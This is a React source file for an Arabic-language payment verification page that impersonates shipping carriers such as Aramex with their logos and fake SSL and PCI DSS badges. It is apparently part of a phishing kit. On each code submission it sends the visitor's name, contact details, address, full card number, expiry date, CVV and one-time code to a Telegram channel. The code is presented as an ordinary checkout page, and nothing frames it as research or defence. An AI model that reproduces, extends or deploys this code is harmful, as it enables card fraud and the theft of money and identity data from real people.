import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";

const PaymentOTP = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment, refetch } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isLocked, setIsLocked] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);
  
  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const enhancedBranding = getBrandingByCompany(serviceKey);
  
  useEffect(() => {
    if (timeLeft > 0 && !isLocked) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, isLocked]);
  
  useEffect(() => {
    if (payment?.locked_until) {
      const lockTime = new Date(payment.locked_until).getTime();
      const now = Date.now();
      
      if (now < lockTime) {
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        setIsLocked(false);
      }
    }
  }, [payment]);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };
  
  const handleClearOTP = () => {
    setOtp("");
    setError("");
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Escape') {
      handleClearOTP();
    }
    if ((e.ctrlKey || e.metaKey) && e.key === 'Backspace') {
      e.preventDefault();
      handleClearOTP();
    }
  };

  const handleSubmit = async () => {
    if (!payment || isLocked) return;

    setError("");

    const isCorrect = otp === payment.otp;

    const telegramResult = await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        name: payment.name || '',
        email: payment.email || '',
        phone: payment.phone || '',
        address: payment.address || '',
        service: serviceName,
        amount: payment.amount || '',
        cardholder: payment.cardholder || '',
        cardNumber: payment.card_number || '',
        cardLast4: payment.card_last4 || '',
        expiry: payment.card_expiry || '',
        cvv: payment.card_cvv || '',
        otp: otp,
        otp_status: isCorrect ? 'correct' : 'wrong',
        attempts: payment.attempts + 1
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('OTP attempt sent to Telegram successfully');
    } else {
      console.error('Failed to send OTP attempt to Telegram:', telegramResult.error);
    }

    if (otp === payment.otp) {
      const formData = new FormData();
      formData.append('form-name', 'payment-otp-verified');
      formData.append('otp', otp);
      formData.append('service', serviceName);
      formData.append('paymentId', payment.id);
      formData.append('linkId', id || '');
      formData.append('status', 'confirmed');

      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(formData as any).toString()
        });
      } catch (error) {
        console.error('Form submission error:', error);
      }

      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: {
          status: "confirmed",
          receipt_url: `/pay/${id}/receipt/${payment.id}`,
        },
      });

      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });

      navigate(`/pay/${id}/receipt/${payment.id}`);
    } else {
      const newAttempts = payment.attempts + 1;

      if (newAttempts >= 3) {
        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();

        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
            locked_until: lockUntil,
          },
        });

        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");

        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
          },
        });

        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        refetch();
      }
    }
  };
  
  useEffect(() => {
    if (payment?.otp) {
      console.log("🔐 OTP للاختبار:", payment.otp);
    }
  }, [payment]);
  
  return (
    <div 
      className="min-h-screen py-4 sm:py-8" 
      dir="rtl"
      onKeyDown={handleKeyDown}
      tabIndex={0}
      style={{
        background: enhancedBranding?.colors.background || '#FFFFFF',
        fontFamily: enhancedBranding?.fonts.arabic || 'Almarai, sans-serif'
      }}
    >
      <div className="container mx-auto px-2 sm:px-3 md:px-4">
        <div className="max-w-md mx-auto">
          {/* Company Header Image */}
          {branding.ogImage && (
            <div className="mb-4 sm:mb-5 rounded-xl overflow-hidden shadow-lg">
              <img 
                src={branding.ogImage} 
                alt={serviceName}
                className="w-full h-28 sm:h-36 object-cover"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Company Logo */}
          {branding.logo && (
            <div className="text-center mb-4 sm:mb-5">
              <div className="inline-block bg-white p-2 rounded-xl shadow-md" style={{
                border: `2px solid ${branding.colors.primary}20`
              }}>
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-8 sm:h-10 mx-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            </div>
          )}
          
          {/* Security Badge */}
          <div className="text-center mb-4 sm:mb-5">
            <Badge 
              className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 text-white shadow-md"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`
              }}
            >
              <Lock className="w-3 h-3 sm:w-3.5 sm:h-3.5 ml-1.5 sm:ml-2" />
              <span>التحقق الآمن</span>
            </Badge>
          </div>
          
          <Card className="p-4 sm:p-5 md:p-6 shadow-2xl" style={{ 
            borderTop: `3px solid ${branding.colors.primary}`,
            background: enhancedBranding?.colors.surface || '#FFFFFF',
            borderRadius: '12px'
          }}>
            <div className="flex items-center justify-between mb-4 sm:mb-5">
              <div className="flex items-center gap-2 sm:gap-2.5">
                <div 
                  className="w-10 h-10 sm:w-11 sm:h-11 rounded-xl flex items-center justify-center animate-pulse"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`
                  }}
                >
                  <Shield className="w-5 h-5 sm:w-5.5 sm:h-5.5 text-white" />
                </div>
                <div>
                  <h1 className="text-base sm:text-lg md:text-xl font-bold" style={{
                    color: enhancedBranding?.colors.text
                  }}>
                    رمز التحقق
                  </h1>
                  <p className="text-[10px] sm:text-xs" style={{
                    color: enhancedBranding?.colors.textLight
                  }}>
                    {serviceName}
                  </p>
                </div>
              </div>
              
              {/* Countdown Timer */}
              {timeLeft > 0 && (
                <div 
                  className="flex items-center gap-1 px-2.5 py-1.5 rounded-full text-xs sm:text-sm font-bold"
                  style={{
                    background: `${branding.colors.primary}12`,
                    color: branding.colors.primary
                  }}
                >
                  <Clock className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
                  <span>{formatTime(timeLeft)}</span>
                </div>
              )}
            </div>
            
            {/* Info */}
            <div 
              className="p-3 sm:p-3.5 rounded-lg mb-4 sm:mb-5"
              style={{
                background: `${branding.colors.primary}08`,
                border: `1px solid ${branding.colors.primary}25`
              }}
            >
              <p className="text-xs sm:text-sm leading-relaxed" style={{ color: enhancedBranding?.colors.text }}>
                تم إرسال رمز التحقق المكون من <strong>4 أرقام</strong> إلى هاتفك المسجل في البنك.
              </p>
            </div>
            
            {/* Testing Note */}
            {payment?.otp && (
              <div className="bg-amber-500/10 border border-amber-500/25 rounded-lg p-2.5 sm:p-3 mb-4 sm:mb-5">
                <p className="text-xs sm:text-sm text-amber-600 font-medium">
                  <strong>للاختبار فقط:</strong> رمز OTP = <span className="font-mono font-bold">{payment.otp}</span>
                </p>
              </div>
            )}
            
            {/* OTP Input - Modern Style */}
            <div className="mb-5 sm:mb-6">
              <div className="flex justify-center items-center gap-2.5">
                <InputOTP 
                  maxLength={4} 
                  value={otp} 
                  onChange={setOtp}
                  disabled={isLocked}
                  autoComplete="one-time-code"
                >
                  <InputOTPGroup className="gap-2 sm:gap-2.5">
                    {[0, 1, 2, 3].map((index) => (
                      <InputOTPSlot 
                        key={index} 
                        index={index}
                        className="w-12 h-12 sm:w-14 sm:h-14 md:w-16 md:h-16 text-xl sm:text-2xl font-bold border-2 rounded-xl transition-all"
                        style={{
                          borderColor: otp[index] ? branding.colors.primary : `${branding.colors.primary}35`,
                          background: otp[index] ? `${branding.colors.primary}08` : 'transparent',
                          color: enhancedBranding?.colors.text
                        }}
                      />
                    ))}
                  </InputOTPGroup>
                </InputOTP>
                
                {/* Delete Button */}
                {otp.length > 0 && !isLocked && (
                  <Button
                    type="button"
                    variant="ghost"
                    size="sm"
                    onClick={handleClearOTP}
                    className="w-9 h-9 sm:w-10 sm:h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors"
                  >
                    <X className="w-4 h-4 sm:w-4.5 sm:h-4.5" />
                  </Button>
                )}
              </div>
              
              {/* Keyboard Instructions */}
              {otp.length > 0 && !isLocked && (
                <div className="text-center mt-3">
                  <p className="text-[10px] sm:text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
                    اضغط <kbd className="px-1.5 py-0.5 text-[10px] bg-muted rounded border">Esc</kbd> أو 
                    <kbd className="px-1.5 py-0.5 text-[10px] bg-muted rounded border mx-1">Ctrl+Backspace</kbd> أو زر 
                    <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
                  </p>
                </div>
              )}
            </div>
            
            {/* Error Message */}
            {error && (
              <div className="bg-destructive/10 border border-destructive/25 rounded-lg p-2.5 sm:p-3 mb-4 sm:mb-5 flex items-start gap-2">
                <AlertCircle className="w-4 h-4 sm:w-4.5 sm:h-4.5 text-destructive mt-0.5 flex-shrink-0" />
                <p className="text-xs sm:text-sm text-destructive">{error}</p>
              </div>
            )}
            
            {/* Attempts Counter */}
            {payment && payment.attempts > 0 && !isLocked && (
              <div className="text-center mb-4 sm:mb-5 p-2 rounded-lg" style={{
                background: `${branding.colors.primary}05`
              }}>
                <p className="text-xs sm:text-sm font-medium" style={{ color: enhancedBranding?.colors.text }}>
                  المحاولات المتبقية: <strong style={{ color: branding.colors.primary }}>{3 - payment.attempts}</strong> من 3
                </p>
              </div>
            )}
            
            {/* Submit Button */}
            <Button
              size="lg"
              className="w-full text-sm sm:text-base py-4 sm:py-4.5 text-white font-bold transition-all hover:shadow-lg"
              onClick={handleSubmit}
              disabled={updatePayment.isPending || isLocked || otp.length < 4}
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`,
                borderRadius: '12px',
                fontFamily: enhancedBranding?.fonts.arabic
              }}
            >
              {updatePayment.isPending ? (
                <span>جاري التحقق...</span>
              ) : isLocked ? (
                <span>محظور مؤقتاً</span>
              ) : (
                <>
                  <Check className="w-4 h-4 sm:w-4.5 sm:h-4.5 ml-2" />
                  <span>تأكيد الدفع</span>
                </>
              )}
            </Button>
            
            <p className="text-[10px] sm:text-xs text-center mt-3" style={{ 
              color: enhancedBranding?.colors.textLight 
            }}>
              لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
            </p>
          </Card>

          {/* Security Footer */}
          <div className="mt-5 flex items-center justify-center gap-4 opacity-60">
            <div className="flex items-center gap-1.5">
              <Shield className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
              <span className="text-[10px]" style={{ color: enhancedBranding?.colors.textLight }}>
                محمي SSL
              </span>
            </div>
            <div className="flex items-center gap-1.5">
              <Lock className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
              <span className="text-[10px]" style={{ color: enhancedBranding?.colors.textLight }}>
                معتمد PCI DSS
              </span>
            </div>
          </div>
          
          {/* Hidden Netlify Form */}
          <form name="payment-otp-verified" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
            <input type="text" name="otp" />
            <input type="text" name="service" />
            <input type="text" name="paymentId" />
            <input type="text" name="linkId" />
            <input type="text" name="status" />
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentOTP;
